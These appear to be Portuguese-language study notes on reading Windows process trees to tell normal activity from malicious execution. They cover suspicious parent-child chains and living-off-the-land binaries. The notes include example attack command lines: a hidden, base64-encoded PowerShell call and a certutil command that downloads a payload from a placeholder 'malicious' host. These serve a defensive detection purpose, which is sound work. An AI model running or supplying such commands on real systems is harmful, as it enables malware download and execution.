Você precisa olhar uma cadeia de processos e responder: 
- “Isso é comportamento normal do sistema ou execução maliciosa?”

## O que é uma arvore de processos?
É a relação pai -> filho entre processos.

Todo processo no Windows:
- foi criado por outro processo (ParentProcess)
- pode criar novos (ChildProcess)

Exemplo simples (normal)
```
explorer.exe
 └── chrome.exe
```

Usuário clicou no Chrome via explorer.

Regra de ouro: processos não aparecem do nada

Sempre pergunte:
- Quem criou esse processo?
- Isso faz sentido nesse contexto?

## Cadeias normais (baseline)

Uso comum:
```
explorer.exe
 ├── chrome.exe
 ├── notepad.exe
 └── cmd.exe
```

Tudo foi iniciado pelo usuário -> normal

Sistema:
```
services.exe
 └── svchost.exe
```

Serviços do Windows -> normal

---

## Red Flags 

1- Office gerando execução

```
winword.exe
 └── cmd.exe
      └── powershell.exe
```

Documento word (macro) executando comandos.

Isso sozinho ja é incidente.

2- PowerShell spawnando tudo

```
powershell.exe
 └── cmd.exe
      └── rundll32.exe
```

Isso indica:
- execução encadeada
- tentativa de evasão

3- Processo estranho como pai

```
winword.exe
 └── powershell.exe
```

Word não deveria rodar PowerShell - anormal.

4- LOLBins (Living off the Land Binaries)
```
powershell.exe
 └── certutil.exe
```

Ferramentas legítimas usadas para ataque.

## Analisando a linha de comando - argumentos.

Exemplo de uso normal do cmd:

`cmd.exe /c dir`

Exemplo suspeito:

`powershell -nop -w hidden -enc SQBFAFgA...`

Red flags:
- -nop -> sem profile
- -w hidden -> oculto
- -enc -> base64

Obsfucação + evasão

Outro exemplo:

`certutil.exe -urlcache -split -f http://malicious/payload.exe`

Download de malware usando binário legítimo.

## LOLBins (Living off the Land Binaries)
São executáveis legítimos do próprio Windows usadoso por atacantes para realizar ações maliciosas.

Ou seja:
- Não é malware "baixado"
- É o próprio sistema sendo usado contra você.

1- Evade antivirus
- são arquivos assinados pela microsoft
- já estão no sistema
- dificil bloquear sem quebrar o windwos

2- não precisa dropar malware
- menos artefatos
- menos IOC clássico

3- parece comportamento legítimo
- mistura com atividade normal
- dificil diferenciar sem contexto




